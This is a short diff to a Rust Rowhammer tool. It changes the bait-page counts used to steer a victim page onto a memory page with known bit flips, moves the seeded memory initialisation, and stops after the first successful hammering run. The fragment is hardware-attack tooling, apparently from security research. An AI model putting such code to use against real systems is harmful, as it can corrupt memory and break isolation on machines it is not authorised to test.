@@ -474,6 +474,7 @@ unsafe fn _main() -> anyhow::Result<()> {
             .find(|r| r.bit_flips.iter().any(|b| b.addr == addr))
             .expect("no round with flips in addr")
             .seed;
+        memory.initialize(seed);
         let addr = addr & !0xfff; // mask out the lowest 12 bits
 
         let victim = if args.target.is_empty() {
@@ -485,19 +486,19 @@ unsafe fn _main() -> anyhow::Result<()> {
                 InjectionConfig {
                     flippy_page: addr as *mut libc::c_void,
                     flippy_page_size: PAGE_SIZE,
-                    bait_count_after: 5,
-                    bait_count_before: 9,
+                    bait_count_after: 7,
+                    bait_count_before: 0,
                 },
             )?)
         };
         match victim {
             Some(mut victim) => {
                 for _ in 0..100 {
-                    memory.initialize(seed);
                     let result = hammer.hammer(&mut victim);
                     match result {
                         Ok(result) => {
                             info!("Hammering successful: {:?}", result.victim_result);
+                            return Ok(());
                         }
                         Err(e) => {
                             warn!("Hammering not successful: {:?}", e);
